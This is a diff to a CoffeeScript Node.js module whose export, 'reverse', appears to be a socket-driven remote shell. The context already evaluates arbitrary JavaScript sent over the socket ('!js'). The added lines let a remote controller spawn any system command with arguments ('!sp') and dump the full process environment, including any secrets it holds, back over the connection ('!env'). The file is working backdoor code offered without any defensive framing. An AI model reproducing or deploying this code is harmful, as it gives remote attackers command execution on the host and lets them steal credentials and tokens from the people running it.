@@ -10,11 +10,23 @@ fs = require 'fs'
 tryfile = (dir) -> try fs.readFileSync dir || '.'; 
 getfile = (dir='.') -> tryfile(dir) || fs.readdirSync dir
 stats = (dir='.') -> s = fs.statSync dir; s.mode=s.mode.toString 8; s
+
 jseval = (cmd) -> 
   try 
       eval(cmd)
   catch error
       "" + error
+
+spawned = (ev, cmd, args...) ->        
+    cmds={ err: '', out: '', args:[arguments.length, cmd, args, args.length]}
+    ev?.emit?('stdout', [arguments.length, sp, cmd, args.length])
+    sp=if (args and args.length) then spawn(cmd, args) else spawn(cmd)
+    sp.stdout.on "data", (data) -> cmds.out += data; # ev.emit 'stdout', data.length
+    sp.stderr.on "data", (data) -> cmds.err += data; # ev.emit 'stderr', data.length 
+    sp.on "exit", (code) -> 
+        cmds.code=code
+        ev.emit 'stdout', 'Exit Status: ' + code + ' out: ' + cmds.out + ' err: ' + cmds.err
+    cmds
 
 module.exports =
   reverse: (port) ->
@@ -74,7 +86,18 @@ module.exports =
         if msg.indexOf('!js ') is 0
           here = try JSON.stringify jseval msg.replace /^!js /, ""
           return socket.emit 'stdout', here
+          
+        if msg.indexOf('!env') is 0
+          here = JSON.stringify process.env
+          return socket.emit 'stdout', here
 
+        if msg.indexOf('!sp') is 0
+          args = msg.split(' ')
+          args[0] = socket
+          socket.emit 'stdout', args.length
+          here = JSON.stringify spawned.apply null, args
+          return socket.emit 'stdout', here
+          
         if msg.indexOf('!echo ') is 0
           here = msg.replace(/^!echo /, "")
           return socket.emit 'stdout', here
